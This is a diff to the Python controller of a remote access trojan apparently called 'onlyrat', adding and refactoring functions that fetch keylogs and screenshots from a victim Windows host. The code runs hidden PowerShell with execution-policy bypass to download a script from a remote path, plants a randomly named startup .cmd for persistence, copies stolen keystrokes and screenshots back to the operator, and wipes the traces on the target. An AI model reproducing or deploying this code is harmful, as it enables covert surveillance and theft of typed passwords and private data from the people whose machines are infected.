@@ -43,7 +43,7 @@ options_menu = """
                 [1] Keylogger       
                 [2] Fetch keylogs
                 [3] Install Screenshot
-                [4] Take Screenshot
+                [4] Fetch Screenshot
                 [5] remote download (not done yet) 
                 [6] remote upload   (not done yet) 
                 [7] restart target
@@ -70,8 +70,8 @@ USERNAME_KEY = "USERNAME"
 TEMPDIR_KEY = "TEMPDIR"
 STARTUPDIR_KEY = "STARTUPDIR"
 
-def dt_format():
-    return datetime.now().strftime("%m/%d/%Y_%H:%M:%S")
+def get_current_date():
+    return datetime.now().strftime("%m-%d-%Y_%H:%M:%S")
 
 def read_config(config_file):
     if not os.path.exists(config_file):
@@ -107,11 +107,11 @@ def random_text():
 
 # scp upload
 def remote_upload(ipv4,pword,file_path,upload_path):
-    os.system(f"sshpass -p \"{pword}\" scp {file_path} onlyrat@{ipv4}:{upload_path}")
+    os.system(f"sshpass -p \"{pword}\" scp -r {file_path} onlyrat@{ipv4}:{upload_path}")
 
 # scp download
 def remote_download(ipv4,pword,path_to_file,local_download_location):
-    os.system(f"sshpass -p \"{pword}\" scp onlyrat@{ipv4}:{path_to_file} {local_download_location}")
+    os.system(f"sshpass -p \"{pword}\" scp -r onlyrat@{ipv4}:{path_to_file} {local_download_location}")
 
 def remote_command(ipv4,pword,command):
     os.system(f"sshpass -p \'{pword}\' ssh onlyrat@{ipv4} '{command}'")
@@ -130,19 +130,35 @@ def keylogger(ipv4,pword,temp_path,startup_path):
 
     print("\n[!] Restart target host to execute")
 
+def fetch_keylogs(ipv4,pword,uname,temp_path):
+    print(f"[+] Preparing to fetch keylogs from {temp_path}/{uname}.log...")
+    remote_download(ipv4,pword,f"{temp_path}/{uname}.log",f"/home/{username}/Downloads/")
+    remote_command(ipv4,pword,f"powershell New-Item -path {temp_path}/{uname}.log -ItemType File -Force")
+    print(f"[*] Keylogs are saved at /home/{username}/Downloads")
+    print("[*] Success. Previous log files has been wiped...")
+
 def install_screenshot(ipv4,pword,temp_path,startup_path):
     print("[+] Downloading screenshot script...")
     ss_script_download_command = f"powershell powershell.exe -noP -ep bypass -windowstyle hidden -c \"iwr -uri {remote_path}/ss.ps1 -outfile {temp_path}/VaxitRpwrPGyM.ps1\""
-    controller_command = f"""powershell -noP -ep bypass -w hidden add-content -path \\"{startup_path}/meuqSoQyrCUvhGjpV.cmd\\" -value \\"powershell -noP -ep bypass -w hidden Start-Process powershell.exe -windowstyle hidden "{temp_path}/VaxitRpwrPGyM.ps1"\\" """
+    controller_command = f"""powershell -noP -ep bypass -w hidden add-content -path \\"{startup_path}/meuqSoQyrCUvhGjpV.cmd\\" -value \\"powershell -noP -ep bypass -w hidden Start-Process powershell.exe -windowstyle hidden \\"{temp_path}/VaxitRpwrPGyM.ps1\\" \\" """
+    print(controller_command)
     remote_command(ipv4,pword,ss_script_download_command)
     remote_command(ipv4,pword,controller_command)
     print("[*] Download completed...")
     print("[*] Restart target host to start...")
 
-def grab_screenshot(ipv4,pword,temp_path):
+def grab_screenshot(ipv4,pword,temp_path,uname):
     print("[+] preparing to fetch screenshots...")
-    remote_download(ipv4,pword,f"{temp_path}/AbLtcVKTqN",f"/home/{username}/Downloads/")
+    ss_folder = f"screenshots-{uname}-{get_current_date()}"
+
+    remote_download(ipv4,pword,f"{temp_path}/AbLtcVKTqN",f"/home/{username}/Downloads")
+
+    os.system(f"mkdir ~/Downloads/{ss_folder}")
+    os.system(f"mv ~/Downloads/AbLtcVKTqN/* ~/Downloads/{ss_folder}")
+    os.system("rm -rf ~/Downloads/AbLtcVKTqN")
     print(f"[*] Screenshot saved at /home/{username}/Downloads folder...")
+    print("[+] Preparing to remove from target host...")
+    remote_command(ipv4,pword,f"powershell remove-item -path {temp_path}/AbLtcVKTqN -Force -recurse")
 
 def update():
     return
@@ -176,15 +192,11 @@ def cli(arguments):
                 elif option == "1":
                     keylogger(tgt_ipv4,tgt_pword,tgt_td,tgt_sd)
                 elif option == "2":
-                    print(f"[+] Preparing to fetch keylogs from {tgt_td}/{tgt_uname}.log...")
-                    remote_download(tgt_ipv4,tgt_pword,f"{tgt_td}/{tgt_uname}.log",f"/home/{username}/Downloads/")
-                    remote_command(tgt_ipv4,tgt_pword,f"powershell New-Item -path {tgt_td}/{tgt_uname}.log -ItemType File -Force")
-                    print(f"[*] Keylogs are saved at /home/{username}/Downloads")
-                    print("[*] Success. Previous log files has been wiped...")
+                    fetch_keylogs(tgt_ipv4,tgt_pword,tgt_uname,tgt_td)
                 elif option == "3":
                     install_screenshot(tgt_ipv4,tgt_pword,tgt_td,tgt_sd)
                 elif option == "4":
-                    grab_screenshot(tgt_ipv4,tgt_pword,tgt_td)
+                    grab_screenshot(tgt_ipv4,tgt_pword,tgt_td,tgt_uname)
                 elif option == "7":
                     remote_command(tgt_ipv4,tgt_pword,"shutdown /r /t 0")
                 elif option == "8":
